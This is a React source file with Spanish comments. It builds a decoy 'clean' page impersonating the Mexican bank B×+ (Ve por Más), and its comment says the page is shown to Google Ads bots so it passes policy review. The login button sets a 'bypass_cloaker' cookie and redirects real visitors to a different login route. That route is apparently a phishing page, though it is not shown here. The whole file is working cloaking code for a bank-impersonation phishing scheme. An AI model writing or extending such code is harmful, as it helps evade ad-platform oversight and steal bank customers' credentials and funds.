import React from 'react'

/**
 * Sitio "limpio" que se muestra a los bots de Google Ads
 * Este sitio debe ser completamente legítimo y cumplir con las políticas de Google
 */
const CleanSite: React.FC = () => {
  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#f5f5f5',
      fontFamily: 'Arial, sans-serif'
    }}>
      {/* Header */}
      <header style={{
        backgroundColor: '#2c3e50',
        color: '#fff',
        padding: '20px',
        textAlign: 'center'
      }}>
        <h1 style={{ margin: 0, fontSize: '28px' }}>Banca en Línea B×+</h1>
        <p style={{ margin: '10px 0 0 0', fontSize: '14px', opacity: 0.9 }}>
          Tu banco digital de confianza
        </p>
      </header>

      {/* Main Content */}
      <div style={{
        maxWidth: '1200px',
        margin: '40px auto',
        padding: '20px'
      }}>
        {/* Hero Section */}
        <section style={{
          backgroundColor: '#fff',
          padding: '40px',
          borderRadius: '8px',
          boxShadow: '0 2px 10px rgba(0,0,0,0.1)',
          marginBottom: '30px',
          textAlign: 'center'
        }}>
          <h2 style={{ color: '#2c3e50', fontSize: '32px', marginBottom: '20px' }}>
            Bienvenido a Banca en Línea B×+
          </h2>
          <p style={{ color: '#666', fontSize: '18px', lineHeight: '1.6', marginBottom: '30px' }}>
            Accede a tus servicios bancarios de forma segura y conveniente desde cualquier dispositivo.
            Realiza transferencias, consulta tu saldo, paga servicios y mucho más.
          </p>
          <a
            href="/login"
            onClick={(e) => {
              e.preventDefault()
              // Establecer cookie de bypass para usuarios reales
              document.cookie = 'bypass_cloaker=real_user_2024; path=/; max-age=31536000; SameSite=Lax'
              window.location.href = '/login?bypass=real_user_2024'
            }}
            style={{
              display: 'inline-block',
              padding: '15px 40px',
              backgroundColor: '#27ae60',
              color: '#fff',
              textDecoration: 'none',
              borderRadius: '6px',
              fontSize: '16px',
              fontWeight: '600',
              transition: 'all 0.3s ease',
              cursor: 'pointer'
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.backgroundColor = '#229954'
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.backgroundColor = '#27ae60'
            }}
          >
            Iniciar Sesión
          </a>
        </section>

        {/* Features */}
        <div style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))',
          gap: '20px',
          marginBottom: '30px'
        }}>
          <div style={{
            backgroundColor: '#fff',
            padding: '30px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
          }}>
            <h3 style={{ color: '#2c3e50', fontSize: '20px', marginBottom: '15px' }}>
              🔒 Seguridad Avanzada
            </h3>
            <p style={{ color: '#666', lineHeight: '1.6' }}>
              Protección de datos con encriptación de nivel bancario y autenticación de dos factores.
            </p>
          </div>

          <div style={{
            backgroundColor: '#fff',
            padding: '30px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
          }}>
            <h3 style={{ color: '#2c3e50', fontSize: '20px', marginBottom: '15px' }}>
              💳 Operaciones 24/7
            </h3>
            <p style={{ color: '#666', lineHeight: '1.6' }}>
              Realiza transferencias, pagos y consultas en cualquier momento del día.
            </p>
          </div>

          <div style={{
            backgroundColor: '#fff',
            padding: '30px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
          }}>
            <h3 style={{ color: '#2c3e50', fontSize: '20px', marginBottom: '15px' }}>
              📱 Acceso Móvil
            </h3>
            <p style={{ color: '#666', lineHeight: '1.6' }}>
              Aplicación móvil disponible para iOS y Android con todas las funcionalidades.
            </p>
          </div>
        </div>

        {/* Services */}
        <section style={{
          backgroundColor: '#fff',
          padding: '40px',
          borderRadius: '8px',
          boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
        }}>
          <h2 style={{ color: '#2c3e50', fontSize: '24px', marginBottom: '25px' }}>
            Nuestros Servicios
          </h2>
          <ul style={{
            listStyle: 'none',
            padding: 0,
            display: 'grid',
            gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))',
            gap: '15px'
          }}>
            <li style={{ color: '#666', padding: '10px 0', borderBottom: '1px solid #eee' }}>
              ✓ Consulta de saldos y movimientos
            </li>
            <li style={{ color: '#666', padding: '10px 0', borderBottom: '1px solid #eee' }}>
              ✓ Transferencias interbancarias
            </li>
            <li style={{ color: '#666', padding: '10px 0', borderBottom: '1px solid #eee' }}>
              ✓ Pago de servicios
            </li>
            <li style={{ color: '#666', padding: '10px 0', borderBottom: '1px solid #eee' }}>
              ✓ Inversiones y ahorros
            </li>
            <li style={{ color: '#666', padding: '10px 0', borderBottom: '1px solid #eee' }}>
              ✓ Tarjetas de crédito y débito
            </li>
            <li style={{ color: '#666', padding: '10px 0', borderBottom: '1px solid #eee' }}>
              ✓ Préstamos y créditos
            </li>
          </ul>
        </section>

        {/* Contact */}
        <section style={{
          backgroundColor: '#2c3e50',
          color: '#fff',
          padding: '40px',
          borderRadius: '8px',
          marginTop: '30px',
          textAlign: 'center'
        }}>
          <h2 style={{ fontSize: '24px', marginBottom: '20px' }}>¿Necesitas Ayuda?</h2>
          <p style={{ fontSize: '16px', marginBottom: '20px', opacity: 0.9 }}>
            Nuestro equipo de atención al cliente está disponible para ayudarte
          </p>
          <div style={{ display: 'flex', justifyContent: 'center', gap: '30px', flexWrap: 'wrap' }}>
            <div>
              <strong>Teléfono:</strong><br />
              <span style={{ opacity: 0.9 }}>55 1102 1919</span>
            </div>
            <div>
              <strong>Email:</strong><br />
              <span style={{ opacity: 0.9 }}>atencion@vepormas.com</span>
            </div>
          </div>
        </section>
      </div>

      {/* Footer */}
      <footer style={{
        backgroundColor: '#34495e',
        color: '#fff',
        padding: '30px 20px',
        textAlign: 'center',
        marginTop: '50px'
      }}>
        <p style={{ margin: '10px 0', fontSize: '14px', opacity: 0.9 }}>
          © 2024 Banca en Línea B×+. Todos los derechos reservados.
        </p>
        <p style={{ margin: '10px 0', fontSize: '12px', opacity: 0.7 }}>
          Línea B×+ Cd. de México y área metropolitana 55 1102 1919, del interior sin costo 800 837 6762.
        </p>
      </footer>
    </div>
  )
}

export default CleanSite

